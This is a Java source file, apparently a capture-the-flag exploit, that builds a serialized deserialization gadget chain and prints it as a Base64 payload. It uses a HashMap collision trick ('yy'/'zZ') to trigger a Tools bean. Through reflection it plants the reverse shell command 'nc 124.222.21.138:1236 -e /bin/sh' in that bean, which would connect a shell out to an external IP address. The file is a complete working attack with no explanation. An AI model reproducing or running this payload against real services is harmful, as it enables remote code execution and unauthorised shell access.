package com.ctf.game;

import com.ctf.game.Controller.Tools;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class EXP {
    public static void main(String[] args) throws Exception {
        Hashtable table = getPayload();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(table);
        oos.close();
        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));
        System.out.println(payload);

        ByteArrayInputStream btin = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream objIn = new ObjectInputStream(btin);
        Object o = objIn.readObject();


    }

    public static void setFieldValue( Object target, String name, Object value) {
        try {
            Field field = target.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(target, value);
        } catch (Exception ignore) {
        }
    }

    public static Hashtable getPayload () throws Exception{
        Tools bean = new Tools();
        Object payloadObj = "test";
        setFieldValue(bean, "girlfriend", "nc 124.222.21.138:1236 -e /bin/sh");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", payloadObj);
        map2.put("zZ", bean);
        map2.put("yy", payloadObj);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        return table;
    }
}
